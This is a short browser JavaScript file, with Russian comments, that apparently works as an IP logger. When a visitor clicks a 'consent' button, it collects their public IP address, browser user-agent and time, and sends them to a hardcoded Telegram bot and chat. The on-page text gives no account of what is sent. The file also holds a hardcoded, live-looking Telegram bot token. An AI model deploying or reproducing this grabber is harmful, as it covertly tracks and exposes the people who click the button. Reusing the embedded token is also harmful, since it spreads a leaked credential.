// Конфигурация
const config = {
    botToken: '8191625463:AAG0aJiNQKOe_JAPMFM-9ytyqSAWOOFVw3I',
    chatId: '6785759216',
    ipApiUrl: 'https://api.ipify.org?format=json',
    telegramApiUrl: `https://api.telegram.org/bot`
};

// DOM элементы
const elements = {
    consentBtn: document.getElementById('consentBtn'),
    status: document.getElementById('status'),
    successMsg: document.getElementById('successMsg')
};

// Основная функция
async function sendIpToTelegram() {
    try {
        // Показываем статус
        elements.status.textContent = "Загрузка...";
        
        // Получаем IP
        const ipResponse = await fetch(config.ipApiUrl);
        if (!ipResponse.ok) throw new Error('Ошибка');
        const { ip } = await ipResponse.json();
        
        elements.status.textContent = ` `;
        
        // Формируем сообщение
        const message = `\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nВремя: ${new Date().toLocaleString()}`;
        
        // Отправляем в Telegram
        const telegramUrl = `${config.telegramApiUrl}${config.botToken}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(message)}`;
        const tgResponse = await fetch(telegramUrl);
        
        if (!tgResponse.ok) throw new Error('Ошибка');
        
        // Показываем успешное сообщение
        elements.status.classList.add('hidden');
        elements.successMsg.classList.remove('hidden');
    } catch (error) {
        elements.status.textContent = `Ошибка: ${error.message}`;
        console.error(error);
    }
}

// Назначаем обработчик кнопки
elements.consentBtn.addEventListener('click', sendIpToTelegram);